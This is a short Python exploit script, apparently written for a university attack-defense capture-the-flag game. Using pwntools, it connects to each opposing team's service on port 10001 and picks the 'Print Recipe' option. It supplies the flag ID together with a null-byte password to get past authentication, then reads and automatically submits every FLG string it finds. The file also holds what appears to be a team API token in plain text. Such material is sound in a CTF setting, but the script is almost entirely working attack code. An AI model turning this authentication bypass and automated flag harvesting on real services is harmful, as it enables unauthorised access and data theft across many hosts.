from swpag_client import Team
import requests
import json
import pwn

pwn.context.arch = 'amd64'


t = Team("http://actf3_team.cse545.io", "gMR4zxU0VyuNzKBzdbPD")

for team in t.get_targets(1):
    host=team['hostname']
    recipe_id=team['flag_id']
    p=pwn.remote(host,'10001')
    try:
        p.recvuntil('Print Recipe')
        #p.recvline() #"Your choice (1-3): "
        #p.clean()
        p.sendline('P')
        p.recvuntil('password')
        password='\x00'
        p.sendline(recipe_id)
        p.sendline(password)
    
        #flag=[]
    
        while True:
            p.recvuntil('FLG')
            fflag=p.recv(13)
            fflag="FLG" + fflag
            #flag.append(fflag)
            print(fflag)
            t.submit_flag([fflag])
    except EOFError as error:
        continue
#print("flag is : " + flag)
#flag="FLG" + flag
#print("real flag is : " + flag)
